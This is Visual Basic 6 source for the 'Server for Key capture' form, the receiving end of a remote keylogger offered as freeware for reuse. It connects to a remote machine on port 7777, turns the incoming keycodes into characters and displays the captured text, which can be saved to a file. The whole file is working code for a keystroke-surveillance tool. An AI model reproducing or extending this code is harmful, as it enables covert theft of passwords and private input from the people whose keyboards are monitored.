VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form1 
   Caption         =   "Server for Key capture"
   ClientHeight    =   5610
   ClientLeft      =   165
   ClientTop       =   735
   ClientWidth     =   6495
   Icon            =   "keyserver.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5610
   ScaleWidth      =   6495
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      Height          =   5535
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   0
      Width           =   6375
   End
   Begin VB.ListBox List1 
      Height          =   255
      ItemData        =   "keyserver.frx":0442
      Left            =   3000
      List            =   "keyserver.frx":0572
      TabIndex        =   1
      Top             =   1200
      Width           =   1575
   End
   Begin MSWinsockLib.Winsock wssrv 
      Left            =   4200
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog cdg 
      Left            =   4560
      Top             =   -120
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Menu main 
      Caption         =   "&Menu"
      Begin VB.Menu editfile 
         Caption         =   "&E d i t F i l e"
         Shortcut        =   {F4}
      End
      Begin VB.Menu openfile 
         Caption         =   "&O p e n F i l e"
         Shortcut        =   ^O
      End
      Begin VB.Menu save 
         Caption         =   "&S a v e C o n t e n t"
         Shortcut        =   {F5}
      End
      Begin VB.Menu exit 
         Caption         =   "E &x i t"
      End
   End
   Begin VB.Menu cntion 
      Caption         =   "&Connection"
      Begin VB.Menu connect 
         Caption         =   "&C o n n e c t"
         Shortcut        =   {F2}
      End
      Begin VB.Menu discon 
         Caption         =   "&D i s c o n n e c t"
         Shortcut        =   {F3}
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'************************************************
'        Coded by G.P.Prabu Kumar
' This a freeware. You can share,modify
' or even use in your own project.But
' don't forget to mail me:intelviper@yahoo.com
'************************************************

Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Dim cnt As Integer, cln As String

Private Sub clname_Click()
wssrv.SendData "NAM"
End Sub

Private Sub connect_Click()
On Error GoTo er
Dim clt As String
clt = InputBox("Enter the remote computers name to connect:" & vbCrLf & "(Leave blank for localhost)", "Client name!")
If clt = "" Then
clt = "localhost"
End If
wssrv.RemoteHost = clt
wssrv.RemotePort = 7777
wssrv.connect
connect.Enabled = False
discon.Enabled = True
er:

End Sub

Private Sub discon_Click()
wssrv.Close
discon.Enabled = False
connect.Enabled = True
End Sub

Private Sub editfile_Click()
If editfile.Checked = False Then
Text1.Locked = False
editfile.Checked = True
Else
Text1.Locked = True
editfile.Checked = False
End If
End Sub

Private Sub exit_Click()
End
End Sub

Private Sub Form_Load()
Dim p As String, l As Long
p = Space(100)
l = GetComputerName(p, Len(p))
Caption = Caption & " >Running at: " & UCase(p)
discon.Enabled = False
cnt = 0
End Sub

Private Sub Form_Resize()
On Error Resume Next
Text1.Height = Form1.Height - 800
Text1.Width = Form1.Width - 300

End Sub

Private Sub openfile_Click()
Dim t As String
cdg.Filter = "*.txt"
cdg.ShowOpen
If cdg.FileName = "" Then
Exit Sub
End If
If Len(Text1.Text) <> 0 Then
If MsgBox("Have you saved the content? If not click OK to save it!", vbOKCancel, "1 minute please..") = vbOK Then
 save_Click
End If
End If
Open cdg.FileName For Input As #1
Text1.Text = ""
While Not EOF(1)
Input #1, t
Text1.Text = Text1.Text & t
Wend
Close #1
End Sub

Private Sub save_Click()
Dim fn As String
cdg.Filter = "*.txt"
cdg.ShowSave
If cdg.FileName = "" Then
Exit Sub
End If
Open cdg.FileName For Output As #1
Print #1, Text1.Text
Close #1
End Sub


Private Sub wssrv_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim p() As String
Dim fvl, tvl As String
Dim dt As String
Dim k As Long
wssrv.GetData k
cnt = cnt + 1
For u = 0 To List1.ListCount
dt = List1.List(u)
p = Split(dt, ":")
 If p(0) = k Then
    Text1.Text = Text1.Text & p(1)
 End If
p(0) = ""
p(1) = ""
Next u
End Sub

